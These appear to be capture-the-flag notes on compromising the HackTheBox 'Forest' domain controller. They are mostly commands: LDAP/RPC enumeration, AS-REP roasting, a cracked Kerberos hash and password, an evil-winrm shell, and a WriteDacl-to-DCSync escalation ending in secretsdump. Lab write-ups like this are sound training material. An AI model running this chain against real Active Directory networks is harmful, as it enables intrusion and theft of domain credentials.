#Windows-machine #active-directory 


# Enumerated LDAP service using ldapsearch and rpcclient

```shell
ldapsearch -x -b 'dc=domain,dc=tld' -H ldap://IP 

#other way 

rpcclient -U '' -N <IP>
> enumdomusers # displays all users
> queryusergroup # checks all user group
> querygroup # checks group info
``` 



# used GetNPUsers to get TGT 

```shell
GetNPUsers.py htb.local/svc-alfresco -no-pass -format hashcat -outputfile hashes.asrep -request
```

# cracked the hash using johntheripper
```shell
$krb5asrep$23$svc-alfresco@HTB.LOCAL:5c7989407c8661891fcfcd648d3a58ee$9ab79261b60d3c932fa076c5c3889f68ecde7b39380106567024f68372a7282090ac688353e55061510c41286d2ed8d914eb41e12c5e00872c9a9c7aff24c39cfa8678f39fa2b6302e0f9377d7bdc72c67a054b7fe93769da9ed925e43fd8b9ff202ea933cd3ecdf2a8fdc118db10edde3347b691496c4c07effae374760299ae67576768c03a25f9964a9f48aba2b1913147c02990d9ec3c81d6c257eab0c10b63053fe50fca06da8ac49185f881b65187f51d81d9a001ae9b86fd458b2392d5bc036d0faf5d1a741e0e2466461c32f8f029d368128930d0c079cf47f8081dc5bbfa8808cc0

 john --wordlist=/usr/share/wordlists/rockyou.txt hash.asrep 
#Output
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL) 
```

# got a shell using evil-winrm

```shell
evil-winrm -u svc-alfresco -p 's3rvice' -i 10.129.42.229
```

# Used bloodhound to map out privesc path

>service accounts was a member of Account Operators which has a privilege to create accounts, it also has genericall privilege on Enterprise Key Admins and has the same permission as Exchange Windows permission, 

>Exchange Windows permission has writeDacl Permission on DC htb.local

> Added a user, followed the exploit in BloodHound

> created a user -> added it to the group that has writeDacl permission -> modified the user rights added a DCSync -> then used secretsdump.py
> 


